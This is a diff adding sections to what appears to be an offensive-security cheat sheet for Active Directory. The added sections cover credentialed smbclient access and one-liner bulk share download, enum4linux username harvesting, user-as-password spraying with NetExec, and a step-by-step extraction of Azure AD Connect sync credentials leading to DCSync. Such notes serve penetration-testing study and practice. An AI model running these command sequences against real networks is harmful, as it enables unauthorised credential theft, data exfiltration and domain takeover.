@@ -218,6 +218,29 @@ smbclient //<target>/<share>
 * `//<target>/<share>`: Specifies the target IP and share name (e.g., `//10.81.182.140/anonymous`)
 * Once connected, use commands like `ls`, `get <file>`, `put <file>`, `cd <directory>`, `exit`
 
+* **SMB Client with Credentials** - List shares or connect with a specific username/password
+
+```bash
+smbclient -L //<target> -U '<domain>\<user>%<password>'
+smbclient //<target>/<share> -U '<domain>\<user>%<password>'
+```
+
+* `-U '<domain>\<user>%<password>'`: Supplies domain, username, and password in one go (avoids an interactive password prompt)
+* Omit `%<password>` to be prompted interactively instead
+* **Recursive download of an entire share once connected** (faster than `get`-ing file by file):
+
+```text
+smbclient> recurse ON
+smbclient> prompt OFF
+smbclient> mget *
+```
+
+* Or as a one-liner without entering interactive mode:
+
+```bash
+smbclient //<target>/<share> -U '<domain>\<user>%<password>' -c 'recurse ON; prompt OFF; mget *'
+```
+
 * **SMB Recursive Download** - Downloads files recursively from an SMB share
 
 ```bash
@@ -628,6 +651,19 @@ enum4linux-ng -A <target>
 * Modern rewrite of `enum4linux`; reliable on current Windows
 * Useful **before** you have credentials (null session)
 
+#### Enum4linux (classic) — Build a Username Wordlist
+
+The original `enum4linux` is still handy specifically because its `Users on <target>` output is easy to `grep` straight into a wordlist:
+
+```bash
+enum4linux -U <target> > enum4linux_output.txt
+grep -oP '(?<=Account: )\S+' enum4linux_output.txt > users.txt
+```
+
+* `-U`: Just the user enumeration check (faster than `-a`/all)
+* Only works when a null session (`username ''`, `password ''`) is permitted — common on domain controllers
+* Resulting `users.txt` feeds directly into password spraying (see [SMB Brute Force with CrackMapExec](#smb) and [Password Spraying](#password-spraying))
+
 #### rpcclient
 
 ```bash
@@ -766,6 +802,14 @@ kerbrute passwordspray -d <domain> --dc <DC_IP> users.txt 'Password123!'
 * `kerbrute` uses Kerberos (often quieter than SMB)
 * Try seasonal passwords (`Season2024!`), company name, `Welcome1`
 
+* **User-as-password** — cheap first spray before anything smarter: try each username as its own password:
+
+```bash
+nxc smb <DC_IP> -d <domain> -u users.txt -p users.txt
+```
+
+* With both `-u` and `-p` as files, NetExec by default tries every combination (user × password) — fine for a small `users.txt`, but add `--no-bruteforce` to pair them 1:1 by line instead (needed on larger lists to avoid unnecessary attempts/lockouts) and `--continue-on-success` to keep testing after the first hit
+
 #### Dump LSASS (Meterpreter)
 
 Requires **SYSTEM** or elevated admin. See [Meterpreter Session Basics](#meterpreter-session-basics).
@@ -900,6 +944,40 @@ Add-ADGroupMember -Identity "Domain Admins" -Members <your_user>
 4. secretsdump.py     → NTDS if DA or DCSync rights
 5. evil-winrm -H      → shell as Administrator
 ```
+
+#### Azure AD Connect (AAD Sync) Credential Extraction
+
+Azure AD Connect syncs an on-prem AD to Azure AD / Entra ID. Its sync account (named `MSOL_<hex>` or similar, e.g. `AAD_<hex>`) typically holds **`Replicating Directory Changes`** rights on the domain — the same right DCSync needs — because the sync process uses the same DRS API internally. Its credentials are stored locally (encrypted) in a SQL Server LocalDB instance backing the `ADSync` service.
+
+**Spotting it**: a non-standard AD group like `Azure Admins`, or a user account whose description mentions "Synchronization Service" (often prefixed `AAD_` or `MSOL_`), signals Azure AD Connect is installed somewhere — usually on the host you're already on.
+
+```powershell
+# On a host with Azure AD Connect installed, as a member of its local admin /
+# ADSyncAdmins group (or local admin, or able to query the LocalDB directly):
+
+# 1. Get the extraction script
+# (Kali) wget https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1
+# (evil-winrm) upload Azure-ADConnect.ps1
+
+# 2. Dot-source it (defines a Function, not a module — Import-Module alone won't expose it)
+. .\Azure-ADConnect.ps1
+
+# 3. Run against the local ADSync LocalDB instance
+Azure-ADConnect -server localhost -db ADSync
+```
+
+Output gives the decrypted `forest-login-user` / `forest-login-password` used by the connector — on a misconfigured host this can directly be a Domain Admin or Administrator account:
+
+```
+[+] Domain:   <DOMAIN>
+[+] Username: <user>
+[+] Password: <cleartext password>
+```
+
+* Under the hood: queries `mms_server_configuration` / `mms_management_agent` tables, then loads the service's own `C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll` to decrypt `encrypted_configuration` via its `KeyManager` class
+* If `Server=localhost;...` fails to connect, try `(localdb)\.\ADSync` as the server string instead
+* Reference / full technique writeup: [Azure AD Connect for Red Teamers - xpnsec](https://blog.xpnsec.com/azuread-connect-for-redteam/)
+* If the recovered account only has DCSync rights (not direct DA), feed its credentials into [DCSync](#dcsync) / `secretsdump.py` as usual
 
 ---
 
